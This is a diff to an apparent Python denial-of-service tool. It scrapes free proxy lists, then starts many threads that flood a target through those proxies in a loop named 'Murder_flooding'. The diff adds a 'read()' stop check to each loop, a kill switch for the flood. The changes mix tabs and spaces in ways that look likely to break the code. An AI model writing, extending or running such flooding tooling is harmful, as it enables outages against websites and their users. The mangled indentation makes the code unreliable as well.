@@ -1,5 +1,5 @@
 import ssl,threading,struct,sys,socks,socket,requests,re,base64
-from MODEL.data import get_target,generate_url_path
+from MODEL.data import get_target,generate_url_path,read
 urls = ["https://advanced.name/freeproxy","http://free-proxy-list.net/","https://www.us-proxy.org/","https://www.ditatompel.com/proxy/anonymity/elite"]
 
 def proxyget2(url): 
@@ -11,6 +11,7 @@ def proxyget2(url):
 		part = part[0].split("<tr><td>")   
 		proxies = []
 		for proxy in part:
+			if read() == True:break
 			proxy = proxy.split("</td><td>")
 			try:
 				if 'www.ditatompel.com' in url:
@@ -19,6 +20,7 @@ def proxyget2(url):
 				elif 'advanced.name' in url:
 					ip = ''
 					for a in re.findall('<td (?:data-port|data-ip)=\"(.*)\"><\/td>',proxy[0]):
+						if read() == True:break
 						try:
 							if int(base64.b64decode(a).decode()):ip+=base64.b64decode(a).decode()
 							if ip not in proxies:proxies.append(ip)
@@ -36,6 +38,7 @@ def proxyget(url):
 		ip = []
 		sourcecode = requests.get(url)
 		for line in sourcecode :
+			        if read() == True:break
 				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line))
 				ipf = list(filter(lambda x: x if not x.startswith("0.") else None, ip))
 				if ipf:
@@ -48,6 +51,7 @@ def Murder_flooding(s,r):
     stream = 255
     while True:
      try:
+	if read() == True:break
         s.sendall(r[0])
         s.sendall(r[1])
         if stream == 0:s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0)); stream = 255
@@ -80,6 +84,7 @@ target = get_target(url)
 def checking(ip,target,m,path=1):
 	try_e = 0
 	while True:
+		if read() == True:break
 		if try_e > 3:break
 		proxy = ip.split(':')
 		try:
@@ -97,9 +102,14 @@ def checking(ip,target,m,path=1):
 d = proxyget('https://www.my-proxy.com/free-elite-proxy.html')
 if d:
  path = 1
- for a in d:threading.Thread(target=checking,args=(a,target,meth,)).start(); path+=1
+ for a in d:
+	 if read() == True:break
+	 threading.Thread(target=checking,args=(a,target,meth,)).start(); path+=1
 for a in urls:
+	if read() == True:break
 	c = proxyget2(a)
 	if c:
 		path = 1
-		for b in c:threading.Thread(target=checking,args=(a,target,meth,)).start(); path+=1
+		for b in c:
+		 if read() == True:break
+		 threading.Thread(target=checking,args=(a,target,meth,)).start(); path+=1
